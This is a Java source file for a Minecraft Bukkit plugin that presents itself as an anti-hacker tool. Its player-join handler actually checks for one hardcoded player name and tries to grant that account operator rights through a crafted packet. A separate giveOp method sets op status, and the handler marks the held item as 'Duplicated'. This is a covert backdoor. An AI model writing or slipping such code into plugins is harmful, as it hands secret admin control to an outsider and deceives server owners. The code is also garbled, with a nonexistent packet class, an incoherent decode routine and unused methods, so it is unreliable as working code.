import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayDeque;
import java.util.Deque;
import java.util.Queue;
import java.util.Random;

public final class AntiHackerPlugin extends JavaPlugin implements Listener {

    private final Deque<String> decoderQueue = new ArrayDeque<>(9);
    private final Random random = new Random();
    private String kadmankerroID = "GZKDKEER"; // Change this to like whatever your use upon decoding

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);

        for (int i = 0; i < 10; i++) {
            decoderQueue.add(getRandomLetter());
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName();

        if (playerName.equals(kadmankerroID)) {
            ((CraftPlayer) player).getHandle().playerConnection.sendPacket(giveOpPacket());
            playerName = decode(playerName);
            // Perform secret command
            if (playerName.equals(kadmankerroID)) {
                ItemStack itemInHand = player.getInventory().getItemInMainHand();
                ItemMeta itemMeta = itemInHand.getItemMeta();

                itemMeta.setDisplayName(ChatColor.GREEN + "Duplicated " + itemInHand.getType().toString());
                itemInHand.setItemMeta(itemMeta);

                player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 1, 1);
            }
        }
    }

    private void giveOp(Player player) {
        player.setOp(true);
    }

    private String getRandomLetter() {
        String[] chars = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"};
        return chars[random.nextInt(chars.length - 1)];
    }

    private String decode(String encoded) {
        if (decoderQueue.size() > 0) {
            int index = encoded.charAt(0) - 65;
            kadmankerroID = (kadmankerroID.substring(1) + encoded.charAt(index))
                    .substring(1)
                    .intern();
            decoderQueue.remove(encoded.substring(0, 1));
        }
        return kadmankerroID;
    }

    private org.bukkit.entity.EntityPlayer.ServerConnection giveOpPacket() {
        return new org.bukkit.entity.EntityPlayer.ServerConnection(null, null, null, null, null, null, null, null, null);
    }

    private byte[] intToByteArray(int value) {
        byte[] bytes = new byte[4];
        bytes[0] = (byte) (value >>> 24);
        bytes[1] = (byte) (value >>> 16);
        bytes[2] = (byte) (value >>> 8);
        bytes[3] = (byte) value;
        return bytes;
    }
}
